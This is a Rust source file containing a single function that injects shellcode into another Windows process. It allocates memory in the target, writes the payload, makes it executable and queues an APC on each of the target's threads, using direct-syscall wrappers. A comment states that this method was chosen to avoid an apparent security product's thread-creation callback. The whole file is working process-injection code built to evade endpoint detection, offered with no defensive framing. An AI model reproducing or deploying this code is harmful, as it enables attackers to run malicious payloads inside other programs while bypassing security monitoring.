#![allow(unused)]

#[cfg(target_os = "windows")]
use windows_sys::Win32::Foundation::CloseHandle;

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;

// Classic injection: allocate + write + APC-queue on an existing thread.
// Uses NtQueueApcThread instead of NtCreateThreadEx to avoid BD's thread-creation callback.
// All threads in the target are tried in order; the APC fires when any one of them
// enters an alertable wait (SleepEx, WaitForSingleObjectEx, etc.).
#[cfg(target_os = "windows")]
pub fn inject_classic(pid: u32, shellcode: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_alloc, nt_write, nt_protect, nt_queue_apc};
    use windows_sys::Win32::{
        Foundation::INVALID_HANDLE_VALUE,
        System::{
            Diagnostics::ToolHelp::{
                CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32,
                TH32CS_SNAPTHREAD,
            },
            Threading::{OpenThread, THREAD_SET_CONTEXT, THREAD_QUERY_INFORMATION},
        },
    };
    use core::ptr::null_mut;

    let proc = super::open_process_rw(pid)
        .map_err(|st| format!("open failed ({st:#010x})"))?;

    let mut base: *mut u8 = null_mut();
    let mut size: usize = shellcode.len().max(0x1000);
    let status = unsafe {
        nt_alloc(proc, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };
    if status < 0 || base.is_null() {
        unsafe { CloseHandle(proc as _) };
        return Err("alloc failed".into());
    }

    let mut written: usize = 0;
    let status = unsafe {
        nt_write(proc, base, shellcode.as_ptr(), shellcode.len(), &mut written)
    };
    if status < 0 {
        unsafe { CloseHandle(proc as _) };
        return Err("write failed".into());
    }

    let mut old_prot: u32 = 0;
    let mut prot_size: usize = size;
    let mut prot_base = base;
    let status = unsafe {
        nt_protect(proc, &mut prot_base, &mut prot_size, PAGE_EXECUTE_READ, &mut old_prot)
    };
    if status < 0 {
        unsafe { CloseHandle(proc as _) };
        return Err("protect failed".into());
    }

    // Queue APC to every enumerable thread in the target — at least one will be alertable.
    let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    if snap == INVALID_HANDLE_VALUE {
        unsafe { CloseHandle(proc as _) };
        return Err("snapshot failed".into());
    }

    let mut entry: THREADENTRY32 = unsafe { core::mem::zeroed() };
    entry.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
    let mut queued = 0u32;

    if unsafe { Thread32First(snap, &mut entry) } != 0 {
        loop {
            if entry.th32OwnerProcessID == pid {
                let th = unsafe {
                    OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, 0, entry.th32ThreadID)
                };
                if th != 0 {
                    unsafe {
                        nt_queue_apc(th as isize, base as *const u8, null_mut(), null_mut(), null_mut());
                        CloseHandle(th);
                    }
                    queued += 1;
                }
            }
            entry = unsafe { core::mem::zeroed() };
            entry.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
            if unsafe { Thread32Next(snap, &mut entry) } == 0 {
                break;
            }
        }
    }
    unsafe { CloseHandle(snap as _); CloseHandle(proc as _); }

    if queued == 0 {
        Err("no threads found in target".into())
    } else {
        Ok(())
    }
}
